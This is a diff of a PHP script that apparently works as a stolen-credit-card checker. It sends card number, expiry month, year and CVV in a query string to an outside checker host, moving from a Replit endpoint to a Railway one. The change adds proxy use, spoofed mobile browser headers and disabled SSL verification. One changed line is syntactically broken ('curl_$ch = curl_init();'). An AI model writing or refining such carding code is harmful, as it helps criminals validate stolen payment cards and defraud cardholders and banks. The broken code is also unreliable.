@@ -47,9 +47,12 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
-
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://waa.emmailfnen235.repl.co/api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+curl_$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -60,20 +63,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: replit.com',
-'method: GET',
-'path: api.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'',
-'scheme: https',
+'GET /chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' h2',
+'Host: lista-production-9b29.up.railway.app',
+'user-agent: Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site: none',
+'sec-fetch-mode: navigate',
+'sec-fetch-user: ?1',
+'sec-fetch-dest: document',
 'accept-language: en-US,en;q=0.9',
-'content-type: ',
-'cookie: ',
-'sec-fetch-dest: empty',
-'sec-fetch-mode: cors',
-'sec-fetch-site: same-origin',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
   ));
-
 # ----------------- [2req Postfields] ---------------------#
 
 $result2a = curl_exec($ch);
